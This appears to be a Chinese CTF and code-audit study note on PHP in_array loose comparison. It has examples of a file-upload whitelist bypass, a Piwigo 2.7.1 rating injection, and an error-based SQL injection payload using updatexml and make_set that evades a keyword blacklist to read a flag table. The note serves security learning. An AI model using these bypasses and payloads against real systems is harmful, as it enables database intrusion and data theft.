
- [day1:](#day1)
  - [关键点](#%E5%85%B3%E9%94%AE%E7%82%B9)
    - [`in_array`函数](#inarray%E5%87%BD%E6%95%B0)
  - [例子1:](#%E4%BE%8B%E5%AD%901)
  - [例子2 Day 1 - Wish List:](#%E4%BE%8B%E5%AD%902-day-1---wish-list)
  - [例子3 piwigo2.7.1](#%E4%BE%8B%E5%AD%903-piwigo271)
  - [例子4 CTF题目](#%E4%BE%8B%E5%AD%904-ctf%E9%A2%98%E7%9B%AE)
    - [`updatexml` 函数:](#updatexml-%E5%87%BD%E6%95%B0)
    - [`make_set()` 函数:](#makeset-%E5%87%BD%E6%95%B0)
  - [总结:](#%E6%80%BB%E7%BB%93)
    - [危险函数:](#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0)
    - [构造poc:报错注入](#%E6%9E%84%E9%80%A0poc%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5)
  - [refs:](#refs)

---

# day1:

## 关键点

### `in_array`函数 

> (PHP 4, PHP 5, PHP 7)
> 
> 功能: Checks if a value exists in an array
> 
> 定义: `bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )`
> 
> Searches haystack for needle using loose comparison unless strict is set.
> 
> 在 $haystack 中搜索 $needle ，如果第三个参数 $strict 的值为 TRUE ，则 in_array() 函数会进行强检查，检查 $needle 的类型是否和 $haystack 中的相同。如果找到 $haystack ，则返回 TRUE，否则返回 FALSE。

## 例子1:

```
<?php

// Example array

$array = array(
    'egg' => true,
    'cheese' => false,
    'hair' => 765,
    'goblins' => null,
    'ogres' => 'no ogres allowed in this array'
);

// Loose checking -- return values are in comments

// First three make sense, last four do not

in_array(null, $array); // true
in_array(false, $array); // true
in_array(765, $array); // true
in_array(763, $array); // true
in_array('egg', $array); // true
in_array('hhh', $array); // true
in_array(array(), $array); // true

// Strict checking

in_array(null, $array, true); // true
in_array(false, $array, true); // true
in_array(765, $array, true); // true
in_array(763, $array, true); // false
in_array('egg', $array, true); // false
in_array('hhh', $array, true); // false
in_array(array(), $array, true); // false

?>
```

Loose checking returns some crazy, counter-intuitive results when used with certain arrays. 

It is completely correct behaviour, due to PHP's leniency on variable types, but in "real-life" is almost useless.

The solution is to use the strict checking option.

可见用`Loose checking`是没有多大用处的。

---

## 例子2 Day 1 - Wish List:

```
class Challenge {
    const UPLOAD_DIRECTORY = './solutions/';
    private $file;
    private $whitelist;

    public function __construct($file)
    {
        $this->file = $file;
        $this->whitelist = range(1, 24);
    }

    public function __destruct()
    {
        if (in_array($this->file['name'], $this->whitelist)){ 
            move_uploaded_file(
                $this->file['tmp_name'],self::UPLOAD_DIRECTORY . $this->file['name']
            );

        }
    }
}
```

此处`in_array()`函数来检测上传的文件名

关键判断: 

```
if (in_array($this->file['name'], $this->whitelist)) 
```

```
in_array(“7”, $this->whitelist) // true
in_array(“7.php”, $this->whitelist) // true
```

实际上是个`Loose checking`

---

## 例子3 piwigo2.7.1

```
$rate = $_POST['rate']

// rate_items: available rates for a picture
$conf['rate_items'] = array(0,1,2,3,4,5);

if (!isset($rate) or !$conf['rate'] or !in_array($rate, $conf['rate_items']))
{
    return false;
}

$query = 'INSERT INTO '.RATE_TABLE.' (user_id,anonymous_id,element_id,rate,date) VALUES ('$user['id'].','.'\''.$anonymous_id.'\','$image_id.','.$rate.',NOW());';

pwg_query($query);
```

用了`in_array()`函数来检测评分值,也是个`Loose checking`,可以绕过

---

## 例子4 CTF题目

绕过`in_array()`之后要绕过过滤函数`stop_hack`

```
function stop_hack($value){
	$pattern = "insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval";
	$back_list = explode("|",$pattern);
	foreach($back_list as $hack){
		if(preg_match("/$hack/i", $value)) // 模式分隔符后的"i"标记这是一个大小写不敏感的搜索
			die("$hack detected!");
	}
	return $value;
}
```

这个过滤函数过滤了字符串拼接函数

然后题解的payload(报错注入):
`http://localhost/index.php?id=4 and (select updatexml(1,make_set(3,'~',(select flag from flag)),1))`

用到了2个我没接触过的函数`updatexml`、`make_set()`

---

### `updatexml` 函数:

> MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数
> 
> `UPDATEXML (XML_document, XPath_string, new_value);`
> 
> 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
> 
> 第二个参数：XPath_string (Xpath格式的字符串)
> 
> 第三个参数：new_value，String格式，替换查找到的符合条件的数据
作用：改变文档中符合条件的节点的值

---

### `make_set()` 函数:

> `MAKE_SET(bits,str1,str2,…)`
> 
> 返回一个设定值(含子字符串分隔字符串","字符)，在设置位的相应位的字符串。str1对应于位0，str2到第1位，依此类推。在str1，str1有NULL值，…那么不添加到结果


> eg1:
> 
> ![](https://ws2.sinaimg.cn/large/006tNbRwgy1fysjn28wzsj309q03pgmu.jpg)
> 
> bits将转为二进制,1的二进制为0001,倒过来为1000,所以取str1(a),打印a.
> 
> eg2:
> 
> ![](https://ws4.sinaimg.cn/large/006tNbRwgy1fysjnlxblsj309q03w403.jpg)
> 
> bits将转为二进制,3的二进制为0011,倒过来为1100,所以取str1(a),str2(b),打印a,b.
> 
> eg3:
> 
> ![](https://ws1.sinaimg.cn/large/006tNbRwgy1fysjq06qmwj30a603q75q.jpg)
> 
> 1|4转为二进制为0001 | 0100, | 是进行或运算，得到0101，倒过来为1010,所以取str1(a),str3©,打印a,c.


---

## 总结:

### 危险函数:

`in_array`函数(``bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )``)

如果第3个参数如果没加,是个loose checking,可以绕过

### 构造poc:报错注入

如果过滤了常见的字符串查询函数`insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval`

可以考虑使用`(select updatexml(1,make_set(3,'~',(select flag from flag)),1))`

---

## refs:

- [in_array](http://php.net/manual/en/function.in-array.php)
- [MySQL updatexml()、extractvalue() 报错型SQL注入](http://blkstone.github.io/2017/11/09/updatexml-sqli/)
- [updatexml injection without concat](https://xz.aliyun.com/t/2160)
- [MySQL MAKE_SET() function](https://www.w3resource.com/mysql/string-functions/mysql-make_set-function.php)
- [MySQL make_set()的用法](https://blog.csdn.net/qq_41725312/article/details/83039525)
- [SQL注入笔记-updatexml与extractvalue](https://www.jianshu.com/p/a52fe9eaeaa6)